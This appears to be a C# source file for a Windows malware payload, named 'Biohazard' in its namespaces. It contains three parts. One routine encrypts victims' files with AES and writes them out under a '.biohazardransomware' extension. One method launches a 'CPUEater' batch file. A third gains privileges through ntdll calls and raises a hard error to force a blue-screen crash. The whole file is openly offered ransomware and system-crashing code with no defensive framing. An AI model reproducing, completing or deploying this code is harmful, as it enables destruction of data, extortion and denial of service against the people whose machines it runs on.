﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BiohazardRansPayload.EncryptFiles
{
    class BiohazardRansEncrPayload
    {
        public static byte[] GenerateRandomSalt()
        {
            byte[] data = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    // Fille the buffer with the generated data
                    rng.GetBytes(data);
                }
            }

            return data;
        }
        public void FileEncrypt(string inputFile, string password)
        {
            //

            //Random Salt Generate
            byte[] salt = GenerateRandomSalt();

            //Output file 
            FileStream fsCrypt = new FileStream(inputFile + ".biohazardransomware", FileMode.Create);

            //convert password string to byte arrray
            byte[] passwordBytes = System.Text.Encoding.BigEndianUnicode.GetBytes(password);

            //Rijndael symmetric encryption algorithm
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.Zeros;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 5000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.ECB;

            // write salt to the begining of the output file, so in this case can be random every time
            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
            //byte[] buffer = new byte[1048576];
            byte[] buffer = new byte[3432];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    Application.DoEvents(); // -> for responsive GUI, using Task will be better!
                    cs.Write(buffer, 0, read);
                }

                // Close up
                fsIn.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }
        }
    }
}
namespace Biohazard.Payload.CPUEater
{
    class CPUEater
    {
        public void CPUEaterBatchfile()
        {
            Process.Start(@"C:\Temp\BiohazardCPUEater.bat");
        }
    }
}
namespace Biohazard.SetHardError
{
    class HardErrorBSOD
    {
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(
        int Privilege,
        bool bEnablePrivilege,
        bool IsThreadPrivilege,
        out bool PreviousValue
);
        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(
            uint ErrorStatus,
            uint NumberOfParameters,
            uint UnicodeStringParameterMask,
            IntPtr Parameters,
            uint ValidResponseOption,
            out uint Response
        );
        public void BSOD(uint statuserror)
        {
            RtlAdjustPrivilege(19, true, false, out bool previousValue);
            NtRaiseHardError(statuserror, 0, 0, IntPtr.Zero, 6, out uint Response);
        }
    }
}
